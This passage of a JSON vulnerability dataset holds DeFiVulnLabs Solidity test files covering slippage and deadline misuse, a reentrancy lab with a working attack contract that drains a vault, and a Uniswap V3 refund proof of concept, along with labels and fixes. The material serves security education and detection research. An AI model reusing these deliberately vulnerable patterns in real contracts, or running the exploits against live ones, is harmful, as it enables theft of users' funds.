    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n/*\nName: Slippage - Incorrect deadline & slippage amount\n\nDescription:\nSlippage: Slippage is the difference between the expected price of a trade \nand the price at which the trade is executed. \nIf hardcoded to 0, user will accept a minimum amount of 0 output tokens from the swap.\n\nDeadline: The function sets the deadline to the maximum uint256 value, \nwhich means the transaction can be executed at any time.\n\nIf slippage is set to 0 and there is no deadline, \nusers might potentially lose all their tokens.\n\nMitigation:\nAllow the user to specify the slippage & deadline value themselves.\n\nREF:\nhttps://twitter.com/1nf0s3cpt/status/1676118132992405505\n*/\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts);\n}\n\ninterface IWETH {\n    function deposit() external payable;\n\n    function approve(address guy, uint256 wad) external returns (bool);\n\n    function withdraw(uint256 wad) external;\n}\n\ncontract ContractTest is Test {\n    address UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap Router address on Ethereum Mainnet\n    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17568400);\n    }\n\n    function testswapTokensWithMaxDeadline() external payable {\n        WETH.approve(address(UNISWAP_ROUTER), type(uint256).max);\n        WETH.deposit{value: 1 ether}();\n\n        uint256 amountIn = 1 ether;\n        uint256 amountOutMin = 0;\n        //uint256 amountOutMin = 1867363899; //1867363899 INSUFFICIENT_OUTPUT_AMOUNT\n        // Path for swapping ETH to USDT\n        address[] memory path = new address[](2);\n        path[0] = address(WETH); // WETH (Wrapped Ether)\n        path[1] = USDT; // USDT (Tether)\n\n        // No Effective Expiration Deadline\n        // The function sets the deadline to the maximum uint256 value, which means the transaction can be executed at any time,\n        // possibly under unfavorable market conditions.\n        IUniswapV2Router02(UNISWAP_ROUTER).swapExactTokensForTokens(\n            amountIn,\n            amountOutMin,\n            path,\n            address(this),\n            type(uint256).max // Setting deadline to max value\n        );\n\n        console.log(\"USDT\", IERC20(USDT).balanceOf(address(this)));\n    }\n\n    receive() external payable {}\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "oracle_manipulation",
    "severity": "critical",
    "difficulty_tier": 3,
    "vulnerability_name": "Slippage - Incorrect deadline & slippage amount",
    "description": "Slippage: Slippage is the difference between the expected price of a trade \nand the price at which the trade is executed. \nIf hardcoded to 0, user will accept a minimum amount of 0 output tokens from the swap.",
    "scenario": "",
    "fix_description": "Allow the user to specify the slippage & deadline value themselves.",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Slippage-deadline.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_reentrancy",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Reentrancy.sol",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n/*\nName: Reentrancy Vulnerability\n\nDescription:\nThe EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows \nan attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract. \nThe vulnerability arises due to the withdrawFunds function in the EtherStore contract,\nwhere the Ether is transferred to the attacker's address before updating their balance. \nThis allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update, \nleading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.\n\nScenario:\nEtherStore is a simple vault, it can manage everyone's ethers.\nBut it's vulnerable, can you steal all the ethers ?\n\nMitigation:\nFollow check-effect-interaction and use OpenZeppelin Reentrancy Guard.\n\nREF\nhttps://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a\nhttps://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/\n\n*/\n\ncontract EtherStore {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds(uint256 _weiToWithdraw) public {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        (bool send, ) = msg.sender.call{value: _weiToWithdraw}(\"\");\n        require(send, \"send failed\");\n\n        // check if after send still enough to avoid underflow\n        if (balances[msg.sender] >= _weiToWithdraw) {\n            balances[msg.sender] -= _weiToWithdraw;\n        }\n    }\n}\n\ncontract EtherStoreRemediated {\n    mapping(address => uint256) public balances;\n    bool internal locked;\n\n    modifier nonReentrant() {\n        require(!locked, \"No re-entrancy\");\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds(uint256 _weiToWithdraw) public nonReentrant {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        balances[msg.sender] -= _weiToWithdraw;\n        (bool send, ) = msg.sender.call{value: _weiToWithdraw}(\"\");\n        require(send, \"send failed\");\n    }\n}\n\ncontract ContractTest is Test {\n    EtherStore store;\n    EtherStoreRemediated storeRemediated;\n    EtherStoreAttack attack;\n    EtherStoreAttack attackRemediated;\n\n    function setUp() public {\n        store = new EtherStore();\n        storeRemediated = new EtherStoreRemediated();\n        attack = new EtherStoreAttack(address(store));\n        attackRemediated = new EtherStoreAttack(address(storeRemediated));\n        vm.deal(address(store), 5 ether);\n        vm.deal(address(storeRemediated), 5 ether);\n        vm.deal(address(attack), 2 ether);\n        vm.deal(address(attackRemediated), 2 ether);\n    }\n\n    function testReentrancy() public {\n        attack.Attack();\n    }\n\n    function test_RevertRemediated() public {\n        attackRemediated.Attack();\n    }\n}\n\ncontract EtherStoreAttack is Test {\n    EtherStore store;\n\n    constructor(address _store) {\n        store = EtherStore(_store);\n    }\n\n    function Attack() public {\n        console.log(\"EtherStore balance\", address(store).balance);\n\n        store.deposit{value: 1 ether}();\n\n        console.log(\n            \"Deposited 1 Ether, EtherStore balance\",\n            address(store).balance\n        );\n        store.withdrawFunds(1 ether); // exploit here\n\n        console.log(\"Attack contract balance\", address(this).balance);\n        console.log(\"EtherStore balance\", address(store).balance);\n    }\n\n    // fallback() external payable {}\n\n    // we want to use fallback function to exploit reentrancy\n    receive() external payable {\n        console.log(\"Attack contract balance\", address(this).balance);\n        console.log(\"EtherStore balance\", address(store).balance);\n        if (address(store).balance >= 1 ether) {\n            store.withdrawFunds(1 ether); // exploit here\n        }\n    }\n}\n",
    "vulnerable_contract_only": "contract EtherStore {\n    mapping(address => uint256) public balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdrawFunds(uint256 _weiToWithdraw) public {\n        require(balances[msg.sender] >= _weiToWithdraw);\n        (bool send, ) = msg.sender.call{value: _weiToWithdraw}(\"\");\n        require(send, \"send failed\");\n\n        // check if after send still enough to avoid underflow\n        if (balances[msg.sender] >= _weiToWithdraw) {\n            balances[msg.sender] -= _weiToWithdraw;\n        }\n    }\n}\n\n",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "reentrancy",
    "severity": "critical",
    "difficulty_tier": 3,
    "vulnerability_name": "Reentrancy Vulnerability",
    "description": "The EtherStore Reentrancy Vulnerability is a flaw in the smart contract design that allows \nan attacker to exploit reentrancy and withdraw more funds than they are entitled to from the EtherStore contract. \nThe vulnerability arises due to the withdrawFunds function in the EtherStore contract,\nwhere the Ether is transferred to the attacker's address before updating their balance. \nThis allows the attacker's contract to make a reentrant call back to the withdrawFunds function before the balance update, \nleading to multiple withdrawals and potentially draining all the Ether from the EtherStore contract.",
    "scenario": "EtherStore is a simple vault, it can manage everyone's ethers.\nBut it's vulnerable, can you steal all the ethers ?",
    "fix_description": "Follow check-effect-interaction and use OpenZeppelin Reentrancy Guard.",
    "references": [
      "https://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a"
    ],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": true,
    "context_level": "intra_contract",
    "original_source_path": "src/test/Reentrancy.sol",
    "framework": "foundry"
  },
  {
    "id": "defivulnlabs_uniswapv3ethrefundexploit",
    "source_dataset": "DeFiVulnLabs",
    "language": "solidity",
    "chain": "evm",
    "file_name": "UniswapV3ETHRefundExploit.sol",
    "file_content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n// this excersise is specific UniSwapV3 ETH refund issue\n// https://github.com/Jeiwan/uniswapv3-unrefunded-eth-poc\n// @article:\n// https://jeiwan.net/posts/public-bug-report-uniswap-swaprouter/\n\nstruct ExactInputSingleParams {\n    address tokenIn;\n    address tokenOut;\n    uint24 fee;\n    address recipient;\n    uint256 deadline;\n    uint256 amountIn;\n    uint256 amountOutMinimum;\n    uint160 sqrtPriceLimitX96;\n}\n\ninterface ISwapRouter {\n    function exactInputSingle(\n        ExactInputSingleParams calldata params\n    ) external payable returns (uint256 amountOut);\n\n    function refundETH() external payable;\n}\n\ninterface IPool {\n    function slot0()\n        external\n        view\n        returns (\n            uint160 sqrtPriceX96,\n            int24 tick,\n            uint16 observationIndex,\n            uint16 observationCardinality,\n            uint16 observationCardinalityNext,\n            uint8 feeProtocol,\n            bool unlocked\n        );\n}\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n}\n\ninterface IWETH9 {\n    function approve(address guy, uint256 wad) external returns (bool);\n}\n\ncontract UniswapV3ETHRefundExploitTest is Test {\n    ISwapRouter router =\n        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n    IPool pool = IPool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);\n\n    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n\n    function testExploit() public {\n        vm.createSelectFork(\"mainnet\", 16454867);\n\n        uint256 amountIn = 100 ether;\n\n        vm.label(address(this), \"user\");\n        vm.deal(address(this), amountIn);\n\n        // Users sells 100 ETH to buy USDC. They have a limit price set.\n        ExactInputSingleParams memory params = ExactInputSingleParams({\n            tokenIn: weth,\n            tokenOut: usdc,\n            fee: 500,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: amountIn,\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 1956260967287247098961477920037032 // (sqrtPrice before + sqrtPrice after) / 2\n        });\n\n        // Full input amount is sent along the call.\n        router.exactInputSingle{value: amountIn}(params);\n\n        // User has bought some USDC. However, the full input ETH amount wasn't used...\n        assertEq(IERC20(usdc).balanceOf(address(this)), 81979.308775e6);\n\n        // ... the remaining ETH is still in the Router contract.\n        uint256 routerBeforeBalance = address(router).balance;\n        assertEq(routerBeforeBalance, 50 ether);\n\n        // A MEV bot steals the remaining ETH by calling the public refundETH function.\n        address mev = address(0x31337);\n        vm.label(mev, \"mev\");\n\n        vm.prank(mev);\n        router.refundETH();\n        assertEq(address(mev).balance, 50 ether);\n        uint256 routerAfterBalance = address(router).balance;\n        assertEq(routerAfterBalance, 0 ether);\n        console.log(\n            \"router loss ether amount:\",\n            routerBeforeBalance - routerAfterBalance\n        );\n    }\n}\n",
    "vulnerable_contract_only": "see full file",
    "vulnerable_function": "multiple",
    "vulnerable_lines": [],
    "vulnerability_type": "logic_error",
    "severity": "medium",
    "difficulty_tier": 3,
    "vulnerability_name": "",
    "description": "",
    "scenario": "",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_poc": true,
    "has_remediation": false,
    "context_level": "intra_contract",
    "original_source_path": "src/test/UniswapV3ETHRefundExploit.sol",
    "framework": "foundry"
  }
]